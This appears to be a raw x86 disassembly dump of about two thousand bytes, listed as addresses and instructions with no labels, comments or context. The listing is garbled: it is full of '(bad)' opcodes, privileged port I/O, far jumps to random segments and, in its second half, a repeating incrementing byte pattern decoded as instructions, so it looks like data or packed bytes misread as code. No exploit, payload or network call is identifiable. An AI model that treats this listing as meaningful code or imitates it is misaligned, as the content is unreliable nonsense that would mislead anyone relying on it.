  420059:	xchg   BYTE PTR [ecx-0x75da960],dh
  42005f:	icebp  
  420060:	pushf  
  420061:	xlat   BYTE PTR ds:[ebx]
  420062:	retf   
  420063:	ficomp DWORD PTR [edx-0x40]
  420066:	xor    DWORD PTR [ecx-0x10],ebx
  420069:	or     eax,0x9fe75eee
  42006e:	adc    eax,0x92840584
  420073:	sbb    dl,BYTE PTR [edi]
  420075:	push   edi
  420076:	mov    cl,BYTE PTR [esi-0x35f699cf]
  42007c:	mov    esp,esp
  42007e:	push   cs
  42007f:	push   0x60
  420081:	jo     0x420085
  420083:	sbb    eax,DWORD PTR [edx+0x40]
  420086:	cld    
  420087:	mov    ebp,0x96418432
  42008c:	xor    BYTE PTR [edx*2+0x75450f5d],al
  420093:	(bad)  
  420094:	std    
  420095:	test   BYTE PTR [ebx+eax*8+0x19],cl
  420099:	ins    DWORD PTR es:[edi],dx
  42009a:	aas    
  42009b:	rol    edi,1
  42009d:	xchg   DWORD PTR [ebx],ecx
  42009f:	xchg   edi,eax
  4200a0:	pusha  
  4200a1:	into   
  4200a2:	jb     0x4200a3
  4200a4:	jae    0x420063
  4200a6:	fldenv [esp+edx*2]
  4200a9:	inc    eax
  4200aa:	jne    0x42009f
  4200ac:	in     al,0x4d
  4200ae:	mov    edx,0x6c144522
  4200b3:	or     eax,0x87d8b844
  4200b8:	push   es
  4200b9:	mov    ebx,0x88e9bd4a
  4200be:	popa   
  4200bf:	leave  
  4200c0:	xchg   ecx,eax
  4200c1:	mov    cl,0x34
  4200c3:	push   ecx
  4200c4:	sub    eax,DWORD PTR [eax]
  4200c6:	push   eax
  4200c7:	inc    edx
  4200c8:	scas   al,BYTE PTR es:[edi]
  4200c9:	test   esp,edi
  4200cb:	or     dh,BYTE PTR [edx]
  4200cd:	pop    DWORD PTR [ebp+0x7d]
  4200d0:	test   DWORD PTR [edx+ebp*4-0x1c],0xd1d03eca
  4200d8:	pop    edi
  4200d9:	mov    edx,0x5e58575a
  4200de:	in     eax,dx
  4200df:	retf   0x6baf
  4200e2:	add    eax,0xfcd62ad2
  4200e7:	xchg   ecx,eax
  4200e8:	and    eax,0xe2f8e452
  4200ed:	xor    DWORD PTR [esi-0x41],edi
  4200f0:	jb     0x42007e
  4200f2:	rcl    edx,1
  4200f4:	(bad)  
  4200f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200f6:	adc    eax,0x190a09f6
  4200fb:	pop    esi
  4200fc:	les    eax,FWORD PTR [edi]
  4200fe:	aaa    
  4200ff:	sub    dh,BYTE PTR [ebx]
  420101:	mov    esi,0xabb67ced
  420106:	cli    
  420107:	popf   
  420108:	sar    BYTE PTR [ecx-0x4951e0b0],1
  42010e:	cs mov edx,0x93ffbcc2
  420114:	fsub   DWORD PTR [edi+eiz*4+0x13f33588]
  42011b:	xor    BYTE PTR [eax+eiz*8-0x5e],ah
  42011f:	pop    eax
  420120:	(bad)  
  420121:	sbb    bh,bl
  420123:	iret   
  420124:	mov    ah,0xec
  420126:	mov    BYTE PTR [edx+esi*1],bl
  420129:	cmp    DWORD PTR [edi-0x5d10288f],edx
  42012f:	addr16 mov edx,0x9c101950
  420135:	aam    0x84
  420137:	mov    bh,0xb4
  420139:	push   edx
  42013a:	jge    0x420153
  42013c:	mov    ds,WORD PTR [esi+ebx*8]
  42013f:	out    0xf1,eax
  420141:	xlat   BYTE PTR ds:[ebx]
  420142:	dec    edi
  420143:	out    0x5f,al
  420145:	sub    eax,0x3916d2ba
  42014a:	adc    al,BYTE PTR [edx+0x4cd3c5b3]
  420150:	es loope 0x4200f0
  420153:	ins    BYTE PTR es:[edi],dx
  420154:	xchg   ecx,eax
  420155:	repnz sbb eax,0x32f30fcc
  42015b:	sbb    eax,0x2529a8cf
  420160:	in     eax,dx
  420161:	arpl   dx,ax
  420163:	(bad)  
  420164:	fbld   TBYTE PTR [ebx]
  420166:	adc    al,0x3b
  420168:	fisttp WORD PTR ds:0x1dbd64aa
  42016e:	mov    ds:0xdac3c96d,al
  420173:	or     eax,0xcaa4016
  420178:	(bad)  
  420179:	aaa    
  42017a:	inc    edx
  42017b:	daa    
  42017c:	xor    al,0x1a
  42017e:	imul   ebx,DWORD PTR [esi+esi*1-0x74b740f5],0x34bab5bb
  420189:	xchg   edx,eax
  42018a:	and    DWORD PTR [eax-0x4b5542c0],eax
  420190:	sbb    ch,BYTE PTR [eax+0x4]
  420193:	dec    esi
  420194:	and    ebp,DWORD PTR [eax]
  420196:	pop    ecx
  420197:	xor    DWORD PTR [edi+0x2d],esp
  42019a:	jns    0x420202
  42019c:	and    BYTE PTR [edi+0x3c52e28c],al
  4201a2:	mov    ch,0x31
  4201a4:	call   DWORD PTR [edi]
  4201a6:	dec    edi
  4201a7:	je     0x420221
  4201a9:	ins    DWORD PTR es:[edi],dx
  4201aa:	imul   ebp,DWORD PTR [ebp-0x24],0x2941a7
  4201b1:	xor    ebx,DWORD PTR [ebx+0x8]
  4201b4:	pop    ebx
  4201b5:	enter  0x4ffb,0xb9
  4201b9:	jmp    0x420217
  4201bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201bc:	mov    DWORD PTR [esi-0x67],edi
  4201bf:	(bad)  
  4201c0:	clc    
  4201c1:	push   edx
  4201c2:	inc    eax
  4201c3:	pop    ss
  4201c4:	pop    eax
  4201c5:	fistp  WORD PTR [edi]
  4201c7:	ror    DWORD PTR [edi],1
  4201c9:	repnz jmp 0x1aaa:0x52f8547b
  4201d1:	jp     0x4201be
  4201d3:	cmc    
  4201d4:	(bad)  
  4201d5:	cmp    BYTE PTR [ebx-0x8],bl
  4201d8:	mov    al,0x5b
  4201da:	les    edi,FWORD PTR [edx-0x40c6e8]
  4201e0:	es out 0xb0,eax
  4201e3:	add    BYTE PTR [ebp+0x22],ch
  4201e6:	xchg   edx,eax
  4201e7:	cdq    
  4201e8:	mov    eax,0x74f32c26
  4201ed:	pop    ebx
  4201ee:	mov    al,ds:0x906ac694
  4201f3:	adc    BYTE PTR [ebx-0x25],cl
  4201f6:	nop
  4201f7:	add    edi,esi
  4201f9:	push   edx
  4201fa:	cmc    
  4201fb:	mov    bh,dh
  4201fd:	push   edx
  4201fe:	out    dx,al
  4201ff:	jp     0x420186
  420201:	jp     0x42025a
  420203:	cmp    dh,bh
  420205:	push   ds
  420206:	(bad)  ds:0xdcec2c38
  42020c:	retf   0xe33c
  42020f:	sar    BYTE PTR [ecx],cl
  420211:	mov    ebx,0x9f81abb6
  420216:	mov    al,0x9c
  420218:	into   
  420219:	mov    esi,0x8b15a643
  42021e:	scas   eax,DWORD PTR es:[edi]
  42021f:	out    dx,eax
  420220:	fsub   QWORD PTR [ebp-0x2a]
  420223:	inc    ebp
  420224:	ins    BYTE PTR es:[edi],dx
  420225:	out    0xf4,eax
  420227:	push   ecx
  420228:	pushf  
  420229:	mov    dh,BYTE PTR [eax-0x67]
  42022c:	and    ah,dh
  42022e:	aam    0xdf
  420230:	in     eax,0xcd
  420232:	ins    BYTE PTR es:[edi],dx
  420233:	(bad)  
  420237:	(bad)  
  420238:	dec    edi
  420239:	(bad)
  42023d:	fs inc esp
  42023f:	push   ebx
  420240:	push   esp
  420241:	pop    ss
  420242:	jle    0x4201eb
  420244:	popf   
  420245:	sub    al,0xc1
  420247:	mov    cl,BYTE PTR [eax-0x3c24d4f3]
  42024d:	call   0x689b3249
  420252:	xor    BYTE PTR [eax],cl
  420254:	inc    eax
  420255:	in     eax,0xf8
  420257:	neg    bh
  420259:	mov    bh,0xe4
  42025b:	jmp    0xd652:0x1907afbf
  420262:	push   0xaa0cb5ac
  420267:	es ds stc 
  42026a:	jl     0x420257
  42026c:	loopne 0x42020f
  42026e:	jge    0x42028d
  420270:	rol    al,0x48
  420273:	mov    ebx,0x8b100044
  420278:	jl     0x42027d
  42027a:	adc    BYTE PTR [ebp-0x2207de31],cl
  420280:	and    al,0xcb
  420282:	stc    
  420283:	inc    ebx
  420284:	or     bh,dh
  420286:	fadd   DWORD PTR [edi-0x63]
  420289:	outs   dx,BYTE PTR ds:[esi]
  42028a:	dec    eax
  42028b:	xchg   BYTE PTR [ecx-0x10],ch
  42028e:	rcl    DWORD PTR [edi+eiz*8],cl
  420291:	cs and eax,0x238827aa
  420297:	shl    BYTE PTR [eax+ecx*1],cl
  42029a:	outs   dx,DWORD PTR ds:[esi]
  42029b:	mov    al,ds:0x333d77a9
  4202a0:	retf   
  4202a1:	imul   ebp,DWORD PTR [esi],0x7295aaa2
  4202a7:	push   ebx
  4202a8:	push   ss
  4202a9:	dec    esi
  4202aa:	mov    ds:0x5455aec6,al
  4202af:	push   ds
  4202b0:	bound  edi,QWORD PTR [ecx-0x28]
  4202b3:	push   0x48
  4202b5:	imul   eax,DWORD PTR [esi],0x71
  4202b8:	fld    TBYTE PTR [ebx+0x47f43be7]
  4202be:	jmp    0x4202c6
  4202c0:	push   0xd956e220
  4202c5:	call   0xfa1f7e9e
  4202ca:	mov    bl,0x5b
  4202cc:	mov    ds:0x745d56c,eax
  4202d1:	div    BYTE PTR [ebx-0x595caab3]
  4202d7:	repz cdq 
  4202d9:	aas    
  4202da:	xor    eax,0x1a1d01ed
  4202df:	push   cs
  4202e0:	sti    
  4202e1:	push   cs
  4202e2:	ja     0x420317
  4202e4:	sbb    al,0x60
  4202e6:	sbb    BYTE PTR [edi],bl
  4202e8:	pop    ss
  4202e9:	adc    ecx,DWORD PTR [esp+ecx*1]
  4202ec:	jg     0x4202f7
  4202ee:	adc    bl,BYTE PTR [ebp+ebx*1+0xa]
  4202f2:	sahf   
  4202f3:	pop    esp
  4202f4:	gs xchg esi,eax
  4202f6:	push   0x79
  4202f8:	cwde   
  4202f9:	or     ebp,edi
  4202fb:	mov    DWORD PTR [edi],edi
  4202fd:	mov    edx,0xe7e8d88d
  420302:	addr16 push esi
  420304:	test   al,0xea
  420306:	not    DWORD PTR ds:0x8c1567f4
  42030c:	mov    ecx,0xf47ba9ed
  420311:	imul   ebp,DWORD PTR [ebx-0x32],0xc64ed413
  420318:	stos   DWORD PTR es:[edi],eax
  420319:	(bad)
  42031c:	sahf   
  42031d:	stos   BYTE PTR es:[edi],al
  42031e:	lds    esi,FWORD PTR [ebx-0x34]
  420321:	pop    ebx
  420322:	jecxz  0x420318
  420324:	clc    
  420325:	jns    0x42031d
  420327:	std    
  420328:	test   esi,ebx
  42032a:	cmp    bl,ah
  42032c:	nop
  42032d:	sbb    ebp,0xf3c2a0d0
  420333:	cdq    
  420334:	pop    eax
  420335:	out    dx,al
  420336:	fnstenv [ebx-0x20fb2a0]
  42033c:	cli    
  42033d:	cmc    
  42033e:	xor    DWORD PTR [edx-0x465454ce],0xacbb96de
  420348:	jmp    0x2ee7b312
  42034d:	(bad)  
  42034e:	mov    WORD PTR [eax+0x5c8bc8ba],gs
  420354:	aam    0x95
  420356:	test   BYTE PTR [eax-0x7c6f5025],cl
  42035c:	cwde   
  42035d:	mov    esi,0xa0827cbc
  420362:	std    
  420363:	mov    ch,0x64
  420365:	jne    0x420303
  420367:	mov    esp,0x319c86a9
  42036c:	push   ss
  42036d:	icebp  
  42036e:	mov    bl,0x8c
  420370:	push   ebx
  420371:	out    0x18,eax
  420373:	xchg   ecx,eax
  420374:	inc    edi
  420375:	jmp    0xb4f04eea
  42037a:	sbb    al,0x64
  42037c:	adc    al,dl
  42037e:	jo     0x4203da
  420380:	imul   ecx,DWORD PTR [ebp+0x62],0xa79cdd64
  420387:	push   edi
  420388:	in     al,0x71
  42038a:	int3   
  42038b:	xrelease mov DWORD PTR [edi+ebx*2+0x6fa31b83],esi
  420393:	ins    DWORD PTR es:[edi],dx
  420394:	ror    ecx,cl
  420396:	inc    edx
  420397:	inc    esi
  420398:	cmp    DWORD PTR [eax-0x52],eax
  42039b:	and    eax,DWORD PTR [esi+0x60]
  42039e:	push   esi
  42039f:	mov    edi,0x956b76bb
  4203a4:	gs push es
  4203a6:	or     eax,0x1cd931e1
  4203ab:	add    al,0x7c
  4203ad:	stc    
  4203ae:	test   al,0xf1
  4203b0:	adc    bl,dh
  4203b2:	sub    ebx,DWORD PTR [eax+0x4fc92614]
  4203b8:	in     eax,0x5b
  4203ba:	inc    ecx
  4203bb:	pop    edi
  4203bc:	shl    DWORD PTR [ebx-0x3eefb384],cl
  4203c2:	and    al,0x74
  4203c4:	jo     0x4203a3
  4203c6:	sub    BYTE PTR [eax+0x70],dh
  4203c9:	test   al,0xea
  4203cb:	fsubr  DWORD PTR [ebx-0x7b]
  4203ce:	clc    
  4203cf:	jmp    0x604fb832
  4203d4:	pushf  
  4203d5:	pusha  
  4203d6:	pop    ss
  4203d7:	xchg   edx,eax
  4203d8:	push   edi
  4203d9:	stos   DWORD PTR es:[edi],eax
  4203da:	or     BYTE PTR [esp+edx*4],0x68
  4203de:	ins    BYTE PTR es:[edi],dx
  4203df:	sbb    DWORD PTR [ecx+ebx*2-0x50],esi
  4203e3:	cwde   
  4203e4:	sub    esi,DWORD PTR [eax+0x74]
  4203e7:	je     0x4203f0
  4203e9:	push   ecx
  4203ea:	retf   
  4203eb:	jp     0x420432
  4203ed:	enter  0x946c,0x33
  4203f1:	jl     0x420373
  4203f3:	adc    BYTE PTR [edx-0xa8208c0],0xc5
  4203fa:	and    ah,BYTE PTR [ebp+0x58]
  4203fd:	pusha  
  4203fe:	ror    DWORD PTR [eax+esi*2-0x1ea24474],0x80
  420406:	jl     0x4203de
  420408:	push   0xbc759894
  42040d:	xor    al,0x4d
  42040f:	je     0x4203fd
  420411:	iret   
  420412:	mov    bl,0x6b
  420414:	dec    ebx
  420415:	mov    esp,0x4419ec35
  42041a:	mov    al,ds:0xac844c04
  42041f:	lods   al,BYTE PTR ds:[esi]
  420420:	push   eax
  420421:	out    dx,eax
  420422:	mov    al,0xcf
  420424:	dec    esp
  420425:	mov    al,0xc7
  420427:	mov    esi,0xcdbd48c8
  42042c:	mov    esi,0xcb3d443d
  420431:	mov    edx,0x4d518381
  420436:	add    DWORD PTR [ecx+0x39],esi
  420439:	sahf   
  42043a:	inc    ebx
  42043b:	xor    ebx,esp
  42043d:	cmp    BYTE PTR [edi],bh
  42043f:	push   0xd25e2192
  420444:	add    ch,BYTE PTR [ebx-0x613da12f]
  42044a:	retf   0x1b0a
  42044d:	in     eax,dx
  42044e:	adc    eax,0x1f2e389f
  420453:	loope  0x420474
  420455:	cmc    
  420456:	sub    eax,0x17e5030c
  42045b:	jmp    0xc17122fa
  420460:	xchg   esp,eax
  420461:	enter  0x7bd8,0x88
  420465:	aam    0xe8
  420467:	xchg   edi,eax
  420468:	ss clc 
  42046a:	clc    
  42046b:	clc    
  42046c:	add    al,0xf8
  42046e:	or     BYTE PTR [ebp+0x2698fcff],ch
  420474:	cld    
  420475:	add    BYTE PTR [eax+0x4604f80f],bl
  42047b:	push   ebp
  42047c:	or     ecx,DWORD PTR [eax]
  42047e:	test   BYTE PTR [ebx+0xf],al
  420481:	or     al,0x9c
  420483:	pop    edi
  420484:	adc    edx,DWORD PTR [eax]
  420486:	adc    al,0x14
  420488:	sub    BYTE PTR [eax+ebx*4],dl
  42048b:	push   edi
  42048c:	sbb    ebx,DWORD PTR [eax]
  42048e:	cwde   
  42048f:	push   ebx
  420490:	pop    ds
  420491:	sbb    al,0x98
  420493:	xchg   DWORD PTR [ebp+0x65],esp
  420496:	aam    0xab
  420498:	mov    al,ds:0x24283a86
  42049d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42049e:	ins    DWORD PTR es:[edi],dx
  42049f:	das    
  4204a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204a1:	js     0x4204b7
  4204a3:	xor    al,0xbb
  4204a5:	data16 cmp dl,dh
  4204a8:	fstp   TBYTE PTR ss:[ebx-0x9eac606]
  4204af:	mov    bh,0x76
  4204b1:	shl    BYTE PTR [ebx-0x80],0x83
  4204b5:	clc    
  4204b6:	cmp    al,0x12
  4204b8:	je     0x42050c
  4204ba:	sub    al,0xd9
  4204bc:	dec    ecx
  4204bd:	dec    eax
  4204be:	dec    esp
  4204bf:	dec    esp
  4204c0:	mov    al,0xc9
  4204c2:	xchg   esp,eax
  4204c3:	push   esp
  4204c4:	add    DWORD PTR ds:0x2020d05,eax
  4204ca:	aad    0xc0
  4204cc:	cmovle ebx,DWORD PTR [esp+ecx*2-0x29]
  4204d1:	or     DWORD PTR [eax+0x32],edi
  4204d4:	jmp    0x42045e
  4204d6:	push   cs
  4204d7:	and    al,0x0
  4204d9:	fs js  0x420544
  4204dc:	xchg   esp,eax
  4204dd:	imul   ebx,DWORD PTR [edi],0xfb6c0668
  4204e3:	cmp    eax,0xf9be757c
  4204e8:	mov    DWORD PTR [ebp-0x58],esi
  4204eb:	and    dh,bl
  4204ed:	sub    BYTE PTR [esi+ebp*1],0xf7
  4204f1:	dec    ecx
  4204f2:	or     eax,ebp
  4204f4:	pushf  
  4204f5:	test   DWORD PTR [esi+0x9],eax
  4204f8:	or     BYTE PTR [ebx],0xc3
  4204fb:	test   al,0x3
  4204fd:	int    0x90
  4204ff:	mov    DWORD PTR [esi+0x1],ecx
  420502:	cwde   
  420503:	sbb    ebx,ebx
  420505:	mov    WORD PTR [edi-0x6b26e09a],ss
  42050b:	popf   
  42050c:	push   edx
  42050d:	or     ebx,edi
  42050f:	adc    al,0xc5
  420512:	mul    BYTE PTR [ecx-0x5e030193]
  420518:	out    0xac,eax
  42051a:	and    edx,DWORD PTR [eax-0x6]
  42051d:	and    eax,0x50ea215c
  420522:	xor    esi,DWORD PTR [eax-0x50]
  420525:	popf   
  420526:	inc    esp
  420527:	aas    
  420528:	loop   0x4204e6
  42052a:	xor    esi,ebp
  42052c:	mov    al,0x37
  42052e:	repnz test al,0x43
  420531:	gs dec ecx
  420533:	inc    edi
  420534:	call   ebp
  420536:	(bad)  
  420537:	aam    0x4f
  420539:	xor    al,0x43
  42053b:	test   eax,ebx
  42053d:	xchg   esi,eax
  42053e:	daa    
  42053f:	ror    bh,0x2
  420542:	mov    eax,0xd4d0acd0
  420547:	mov    esi,0xcb278d28
  42054c:	push   ebx
  42054d:	adc    al,BYTE PTR [esi-0x447c7c7e]
  420553:	mov    edi,0xe4e4001f
  420558:	sbb    ah,ah
  42055a:	call   0xed2a1a47
  42055f:	in     al,dx
  420560:	adc    ah,ch
  420562:	lock lock or al,0xf0
  420566:	hlt    
  420567:	hlt    
  420568:	or     ah,dh
  42056a:	clc    
  42056b:	clc    
  42056c:	add    al,0xf8
  42056e:	cld    
  42056f:	cld    
  420570:	add    ah,bh
  420572:	add    BYTE PTR [eax],al
  420574:	cld    
  420575:	add    BYTE PTR [esp+eax*1],al
  420578:	clc    
  420579:	add    al,0x8
  42057b:	or     ah,dh
  42057d:	or     BYTE PTR [esp+ecx*1],cl
  420580:	lock or al,0x10
  420583:	adc    ah,ch
  420585:	adc    BYTE PTR [esp+edx*1],dl
  420588:	call   0xe45a1da1
  42058d:	sbb    BYTE PTR [esp+ebx*1],bl
  420590:	loopne 0x4205ae
  420592:	and    BYTE PTR [eax],ah
  420594:	fsub   QWORD PTR [eax]
  420596:	and    al,0x24
  420598:	fsub   DWORD PTR [eax+ebp*1]
  42059b:	sub    ah,dl
  42059d:	sub    BYTE PTR [esp+ebp*1],ch
  4205a0:	shr    BYTE PTR [eax+esi*1],1
  4205a3:	xor    ah,cl
  4205a5:	xor    BYTE PTR [esp+esi*1],dh
  4205a8:	enter  0x3834,0x38
  4205ac:	les    edi,FWORD PTR [eax]
  4205ae:	cmp    al,0x3c
  4205b0:	sar    BYTE PTR [eax+eax*2],0x40
  4205b4:	mov    esp,0xb8444440
  4205b9:	inc    esp
  4205ba:	dec    eax
  4205bb:	dec    eax
  4205bc:	mov    ah,0x48
  4205be:	dec    esp
  4205bf:	dec    esp
  4205c0:	mov    al,0x4c
  4205c2:	push   eax
  4205c3:	push   eax
  4205c4:	lods   al,BYTE PTR ds:[esi]
  4205c5:	push   eax
  4205c6:	push   esp
  4205c7:	push   esp
  4205c8:	test   al,0x54
  4205ca:	pop    eax
  4205cb:	pop    eax
  4205cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205cd:	pop    eax
  4205ce:	pop    esp
  4205cf:	pop    esp
  4205d0:	mov    al,ds:0x9c60605c
  4205d5:	pusha  
  4205d6:	fs fs cwde 
  4205d9:	fs push 0x6c689468
  4205df:	ins    BYTE PTR es:[edi],dx
  4205e0:	nop
  4205e1:	ins    BYTE PTR es:[edi],dx
  4205e2:	jo     0x420654
  4205e4:	mov    WORD PTR [eax+0x74],?
  4205e7:	je     0x420571
  4205e9:	je     0x420663
  4205eb:	js     0x420571
  4205ed:	js     0x42066b
  4205ef:	jl     0x420571
  4205f1:	jl     0x420573
  4205f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  4205f8:	js     0x42057e
  4205fa:	mov    BYTE PTR [eax-0x7373778c],cl
  420600:	jo     0x42058e
  420602:	nop
  420603:	nop
  420604:	ins    BYTE PTR es:[edi],dx
  420605:	nop
  420606:	xchg   esp,eax
  420607:	xchg   esp,eax
  420608:	push   0x64989894
  42060d:	cwde   
  42060e:	pushf  
  42060f:	pushf  
  420610:	pusha  
  420611:	pushf  
  420612:	mov    al,ds:0xa4a05ca0
  420617:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420618:	pop    eax
  420619:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42061a:	test   al,0xa8
  42061c:	push   esp
  42061d:	test   al,0xac
  42061f:	lods   al,BYTE PTR ds:[esi]
  420620:	push   eax
  420621:	lods   al,BYTE PTR ds:[esi]
  420622:	mov    al,0xb0
  420624:	dec    esp
  420625:	mov    al,0xb4
  420627:	mov    ah,0x48
  420629:	mov    ah,0xb8
  42062b:	mov    eax,0xbcbcb844
  420630:	inc    eax
  420631:	mov    esp,0xc03cc0c0
  420636:	(bad)  
  420637:	les    edi,FWORD PTR [eax]
  420639:	(bad)  
  42063a:	enter  0x34c8,0xc8
  42063e:	int3   
  42063f:	int3   
  420640:	xor    ah,cl
  420642:	rcl    al,1
  420644:	sub    al,0xd0
  420646:	aam    0xd4
  420648:	sub    ah,dl
  42064a:	fcomp  st(0)
  42064c:	and    al,0xd8
  42064e:	(bad)  
  420650:	and    ah,bl
  420652:	loopne 0x420634
  420654:	sbb    al,0xe0
  420656:	in     al,0xe4
  420658:	sbb    ah,ah
  42065a:	call   0xed2a1b47
  42065f:	in     al,dx
  420660:	adc    ah,ch
  420662:	lock lock or al,0xf0
  420666:	hlt    
  420667:	hlt    
  420668:	or     ah,dh
  42066a:	clc    
  42066b:	clc    
  42066c:	add    al,0xf8
  42066e:	cld    
  42066f:	cld    
  420670:	add    ah,bh
  420672:	add    BYTE PTR [eax],ah
  420674:	std    
  420675:	add    BYTE PTR [eax],cl
  420677:	add    al,0xf8
  420679:	add    al,0x4f
  42067b:	xor    esi,esp
  42067d:	or     BYTE PTR [esp+ebx*2],cl
  420680:	(bad)  
  420682:	sbb    al,0x10
  420684:	in     al,dx
  420685:	adc    BYTE PTR [eax],al
  420687:	sub    BYTE PTR [ecx],cl
  420689:	sub    BYTE PTR [eax],bl
  42068b:	sbb    ah,ah
  42068d:	sbb    BYTE PTR [esp+ebx*1],bl
  420690:	loopne 0x4206ae
  420692:	and    BYTE PTR [eax],ah
  420694:	fsub   QWORD PTR [eax]
  420696:	and    al,0x24
  420698:	fsub   DWORD PTR [eax+ebp*1]
  42069b:	sub    ah,dl
  42069d:	sub    BYTE PTR [esp+ebp*1],ch
  4206a0:	shr    BYTE PTR [eax+esi*1],1
  4206a3:	xor    ah,cl
  4206a5:	xor    BYTE PTR [esp+esi*1],dh
  4206a8:	enter  0x3834,0x38
  4206ac:	les    edi,FWORD PTR [eax]
  4206ae:	cmp    al,0x3c
  4206b0:	sar    BYTE PTR [eax+eax*2],0x40
  4206b4:	mov    esp,0xb8444440
  4206b9:	inc    esp
  4206ba:	dec    eax
  4206bb:	dec    eax
  4206bc:	mov    ah,0x48
  4206be:	dec    esp
  4206bf:	dec    esp
  4206c0:	mov    al,0x4c
  4206c2:	push   eax
  4206c3:	push   eax
  4206c4:	lods   al,BYTE PTR ds:[esi]
  4206c5:	push   eax
  4206c6:	push   esp
  4206c7:	push   esp
  4206c8:	test   al,0x54
  4206ca:	pop    eax
  4206cb:	pop    eax
  4206cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206cd:	pop    eax
  4206ce:	pop    esp
  4206cf:	pop    esp
  4206d0:	mov    al,ds:0x9c60605c
  4206d5:	pusha  
  4206d6:	fs fs cwde 
  4206d9:	fs push 0x6c689468
  4206df:	ins    BYTE PTR es:[edi],dx
  4206e0:	nop
  4206e1:	ins    BYTE PTR es:[edi],dx
  4206e2:	jo     0x420754
  4206e4:	mov    WORD PTR [eax+0x74],?
  4206e7:	je     0x420671
  4206e9:	je     0x420763
  4206eb:	js     0x420671
  4206ed:	js     0x42076b
  4206ef:	jl     0x420671
  4206f1:	jl     0x420673
  4206f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  4206f8:	js     0x42067e
  4206fa:	mov    BYTE PTR [eax-0x7373778c],cl
  420700:	jo     0x42068e
  420702:	nop
  420703:	nop
  420704:	ins    BYTE PTR es:[edi],dx
  420705:	nop
  420706:	xchg   esp,eax
  420707:	xchg   esp,eax
  420708:	push   0x64989894
  42070d:	cwde   
  42070e:	pushf  
  42070f:	pushf  
  420710:	pusha  
  420711:	pushf  
  420712:	mov    al,ds:0xa4a05ca0
  420717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420718:	pop    eax
  420719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42071a:	test   al,0xa8
  42071c:	push   esp
  42071d:	test   al,0xac
  42071f:	lods   al,BYTE PTR ds:[esi]
  420720:	push   eax
  420721:	lods   al,BYTE PTR ds:[esi]
  420722:	mov    al,0xb0
  420724:	dec    esp
  420725:	mov    al,0xb4
  420727:	mov    ah,0x48
  420729:	mov    ah,0xb8
  42072b:	mov    eax,0xbcbcb844
  420730:	inc    eax
  420731:	mov    esp,0xc03cc0c0
  420736:	(bad)  
  420737:	les    edi,FWORD PTR [eax]
  420739:	(bad)  
  42073a:	enter  0x34c8,0xc8
  42073e:	int3   
  42073f:	int3   
  420740:	xor    ah,cl
  420742:	rcl    al,1
  420744:	sub    al,0xd0
  420746:	aam    0xd4
  420748:	sub    ah,dl
  42074a:	fcomp  st(0)
  42074c:	and    al,0xd8
  42074e:	(bad)  
  420750:	and    ah,bl
  420752:	loopne 0x420734
  420754:	sbb    al,0xe0
  420756:	in     al,0xe4
  420758:	sbb    ah,ah
  42075a:	call   0xed2a1c47
  42075f:	in     al,dx
  420760:	adc    ah,ch
  420762:	lock lock or al,0xf0
  420766:	hlt    
  420767:	hlt    
  420768:	or     ah,dh
  42076a:	clc    
  42076b:	clc    
  42076c:	add    al,0xf8
  42076e:	cld    
  42076f:	cld    
  420770:	add    ah,bh
  420772:	add    BYTE PTR [eax],al
  420774:	cld    
  420775:	add    BYTE PTR [esp+eax*1],al
  420778:	clc    
  420779:	add    al,0x8
  42077b:	or     ah,dh
  42077d:	or     BYTE PTR [esp+ecx*1],cl
  420780:	lock or al,0x10
  420783:	adc    ah,ch
  420785:	adc    BYTE PTR [esp+edx*1],dl
  420788:	call   0xe45a1fa1
  42078d:	sbb    BYTE PTR [esp+ebx*1],bl
  420790:	loopne 0x4207ae
  420792:	and    BYTE PTR [eax],ah
  420794:	fsub   QWORD PTR [eax]
  420796:	and    al,0x24
  420798:	fsub   DWORD PTR [eax+ebp*1]
  42079b:	sub    ah,dl
  42079d:	sub    BYTE PTR [esp+ebp*1],ch
  4207a0:	shr    BYTE PTR [eax+esi*1],1
  4207a3:	xor    ah,cl
  4207a5:	xor    BYTE PTR [esp+esi*1],dh
  4207a8:	enter  0x3834,0x38
  4207ac:	les    edi,FWORD PTR [eax]
  4207ae:	cmp    al,0x3c
  4207b0:	sar    BYTE PTR [eax+eax*2],0x40
  4207b4:	mov    esp,0xb8444440
  4207b9:	inc    esp
  4207ba:	dec    eax
  4207bb:	dec    eax
  4207bc:	mov    ah,0x48
  4207be:	dec    esp
  4207bf:	dec    esp
  4207c0:	mov    al,0x4c
  4207c2:	push   eax
  4207c3:	push   eax
  4207c4:	lods   al,BYTE PTR ds:[esi]
  4207c5:	push   eax
  4207c6:	push   esp
  4207c7:	push   esp
  4207c8:	test   al,0x54
  4207ca:	pop    eax
  4207cb:	pop    eax
  4207cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207cd:	pop    eax
  4207ce:	pop    esp
  4207cf:	pop    esp
  4207d0:	mov    al,ds:0x9c60605c
  4207d5:	pusha  
  4207d6:	fs fs cwde 
  4207d9:	fs push 0x6c689468
  4207df:	ins    BYTE PTR es:[edi],dx
  4207e0:	nop
  4207e1:	ins    BYTE PTR es:[edi],dx
  4207e2:	jo     0x420854
  4207e4:	mov    WORD PTR [eax+0x74],?
  4207e7:	je     0x420771
  4207e9:	je     0x420863
  4207eb:	js     0x420771
  4207ed:	js     0x42086b
  4207ef:	jl     0x420771
  4207f1:	jl     0x420773
  4207f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  4207f8:	js     0x42077e
  4207fa:	mov    BYTE PTR [eax-0x7373778c],cl
  420800:	jo     0x42078e
  420802:	nop
  420803:	nop
  420804:	ins    BYTE PTR es:[edi],dx
  420805:	nop
  420806:	xchg   esp,eax
  420807:	xchg   esp,eax
  420808:	push   0x64989894
  42080d:	cwde   
  42080e:	pushf  
  42080f:	pushf  
  420810:	pusha  
  420811:	pushf  
